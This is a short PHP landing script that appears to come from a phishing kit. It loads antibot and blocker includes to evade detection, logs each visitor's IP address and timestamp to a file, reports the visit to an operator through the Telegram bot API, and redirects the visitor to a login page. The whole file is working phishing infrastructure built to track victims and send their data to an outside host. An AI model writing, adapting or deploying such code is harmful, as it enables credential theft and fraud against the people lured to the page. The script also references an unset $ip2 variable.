<?php
include("./config/antibot.php");
include("./config/antibots.php");
include("./config/antibotsulit.php");
include("./config/blocker.php");
include("./config/bt.php");
include("./config/function.php");
include("./settings/config.php");
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set('Asia/Hong_Kong');
$date = date("M d, Y - h:i:s a");

$mesg = "[$ip2] - VISITOR - [$date]\n";antibot($mesg);
$request_params = [
    'chat_id' => $user_id,
    'text' => $mesg
];
$request_url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.http_build_query($request_params);
file_get_contents($request_url);

$seen = "<font color='#FF00FF' style='font-style:courier;' size='2'>| IP Address : ".$ip2." | Date : ".$date."</font><br>";
$flogs = fopen("./lib/visit.php","a");
fwrite($flogs, $seen);
fclose($flogs);

header("location: login.php");
exit();
?>